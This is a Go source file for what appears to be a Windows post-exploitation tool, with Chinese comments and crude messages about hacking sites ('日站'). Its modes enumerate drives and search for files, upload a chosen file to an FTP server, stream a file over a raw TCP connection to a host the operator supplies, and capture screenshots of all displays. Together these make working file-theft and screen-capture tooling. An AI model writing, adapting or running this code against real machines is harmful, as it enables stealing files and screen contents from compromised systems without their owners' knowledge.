package main

import (
	"flag"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"github.com/dutchcoders/goftp"
	"github.com/kbinani/screenshot"
)

func getlog() []string {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")//读取dll
	Getlog := kernel32.MustFindProc("GetLogicalDrives")//获取这个api，这个api是获取盘驱动是否存在
	n,_,_:=Getlog.Call()//调用并赋值给n
	s := strconv.FormatInt(int64(n),2)//转成2进制
	var drivel_all =[]string{"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P：", "Q：", "R：", "S：", "T：", "U：", "V：", "W：", "X：", "Y：", "Z："}//定义了一个数组
	temp := drivel_all[0:len(s)]//temp就等于从他开始取，获取到的
	var d []string
	for i,v :=range s{
		if v == 49{//如果value等于49
			l :=len(s) -i -1
			d = append(d,temp[l])
		}
	}
	var drives []string
	for i,v :=range d{
		drives =append(drives[i:],append([]string{v},drives[:i]...)...)
	}
	return drives


} //这个函数可以获得所有的盘符
func getFileList(path,wjm string) {
	fs,_:= ioutil.ReadDir(path)
	for _,file:=range fs{
		if file.IsDir(){
			getFileList(path+file.Name()+"/",wjm)
		}else{
			Nameone := path+file.Name()
			result := strings.Index(Nameone,wjm)
			if result != -1{
				fmt.Println(Nameone)
			}
		}
	}
}//这个函数是用来获取文件和搜索文件的
func getFTP(filename,fcip,fcport,fcuser,fcpwd string){
	ftp,err := goftp.Connect(fcip + ":"+ fcport)
	if err != nil{
		fmt.Println("链接不上去，傻逼玩意密码都记不住，还日站")
		panic("")
	}
	err = ftp.Login(fcuser,fcpwd)
	if err !=nil{
		fmt.Println("链接不上去，傻逼玩意密码都记不住，还日站")
		panic("")
	}
	err = ftp.Upload(filename)
	if err !=nil{
		fmt.Println(err)
		fmt.Println("传不上去，你换个办法吧，或者你直接换个人帮你日站吧")
		panic("")
	}
	ftp.Close()

}//这个函数是拿来做FTP上传的
func getsocket(filename,ip,port string){
	info,err := os.Stat(filename)
	if err !=nil{
		fmt.Println("read is no")
		return
	}
	connect,err :=net.Dial("tcp",ip+":"+port)
	if err != nil{
		fmt.Println("nework is no")
		return
	}
	_,werr:=connect.Write([]byte(info.Name()))
	if werr !=nil{
		fmt.Println("file is no")
		return
	}
	buff := make([]byte,4096)
	size,rerr := connect.Read(buff)
	if rerr != nil{
		fmt.Println("read is no")
		return
	}
	if "ok" == string(buff[:size]){
		sendFile(filename,connect)
	}

}//连接函数
func sendFile(filename string,connect net.Conn){
	file,err := os.Open(filename)
	if err != nil{
		fmt.Println("file is no")
		return
	}
	defer file.Close()
	buff := make([]byte,1024*4)
	for{

		size,err := file.Read(buff)
		if err !=  nil{
			if err == io.EOF{
				fmt.Println("ok")
			}else{
				fmt.Println("read is no")
			}
			return
		}
		connect.Write(buff[:size])
	}
}//发送函数
func loadimg(filename string){
	n:=screenshot.NumActiveDisplays()
	for i :=0;i < n;i++{
		bounds := screenshot.GetDisplayBounds(i)
		img,err := screenshot.CaptureRect(bounds)
		if err !=nil{
			panic(err)
		}
		imgfile := fmt.Sprintf(filename)
		file,_ :=os.Create(imgfile)
		defer file.Close()
		png.Encode(file,img)
	}
}//读取屏幕截图
func main(){
	var wjm string
	var xzms string
	var ispwd string
	var filename string
	var fcip string
	var fcport string
	var fcuser string
	var fcpwd string
	flag.StringVar(&xzms,"i","","选择模式")
	flag.StringVar(&wjm,"wj","","文件名")
	flag.StringVar(&ispwd,"ispwd","","是否指定目录去")
	flag.StringVar(&filename,"f","","二模式里面要读取的文件")
	flag.StringVar(&fcip,"ip","","ip地址")
	flag.StringVar(&fcport,"p","","FTP端口")
	flag.StringVar(&fcuser,"user","","FTP用户")
	flag.StringVar(&fcpwd,"pwd","","FTP密码")
	flag.Parse()
	if xzms == ""{
		fmt.Println("你不选择模式是打算让爷猜你的心思吗")
	}else{
		if xzms == "1"{
			if ispwd != ""{
				getFileList(ispwd+"//",wjm)
				return
			}else{
				pf := getlog()
				for a,_ := range pf{
					getFileList(pf[a]+"//",wjm)
				}
			}
		}
		if xzms == "2"{
			if filename=="" ||fcip==""||fcport ==""||fcuser =="" ||fcpwd == ""{
				fmt.Println("你想上传文件还写不清楚，你想让我爆破一下你的ftp吗")
			}else{
				getFTP(filename,fcip,fcport,fcuser,fcpwd)

			}
		}
		if xzms == "3"{
			if filename=="" || fcip==""||fcport ==""{
				fmt.Println("cmd is no")
			}else{
				getsocket(filename,fcip,fcport)
			}
		}
		if xzms == "4"{
			if filename==""{
				fmt.Println("no")
			}
			loadimg(filename)
		}
	}
}